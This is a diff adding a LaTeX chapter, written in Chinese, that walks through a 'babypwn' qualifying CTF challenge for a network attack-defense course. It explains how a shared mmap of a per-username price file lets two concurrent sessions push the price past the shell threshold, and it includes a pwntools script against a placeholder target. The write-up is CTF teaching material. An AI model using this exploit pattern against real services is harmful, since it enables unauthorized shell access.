@@ -1,0 +1,30 @@
+\chapter{pwn}
+\section{乙组基准-babypwn}
+NeSE乙组的基准题，高级网络攻防课说做出来这些题才可以选这门课。这一系列题目因为不是公开平台上的，所以就不放出来了。
+
+这道题进去首先要输入一个name,有三个选项:
+\begin{itemize}
+    \item 1 提高price: 最多提高十次，到100。
+    \item 2 显示price：始终是0。
+    \item 3 获得flag：price到100也换不到，提示price太低。
+\end{itemize}
+
+用ida逆一下，发现price到达200就可以拿到shell，且price是char*，被mmap到了'/tmp/input\_name.acc'：
+\begin{lstlisting}
+rice = mmap(0LL, 8uLL, 3, 1, fd, 0LL);          // PROT_WRITE | PROT_READ
+                                                // MAP_SHARED
+\end{lstlisting}
+各个参数的含义可以用\href{https://github.com/zTrix/magic}{magic}查看。发现是共享映射的，那么直接开两个进程，输入一样的名字，分别提高10次price就可以拿到flag了。
+\begin{lstlisting}
+from pwn import *
+context.log_level = "debug"
+io_0 = remote("TARGET_ADDR", PORT)
+io_0.sendafter("name.\n", b"a")
+io_1 = remote("TARGET_ADDR", PORT)
+io_1.sendafter("name.\n", b"a")
+for i in range(11):
+    io_0.sendlineafter("getflag\n", "1")
+    io_1.sendlineafter("getflag\n", "1")
+io_0.close()
+io_1.interactive()
+\end{lstlisting}
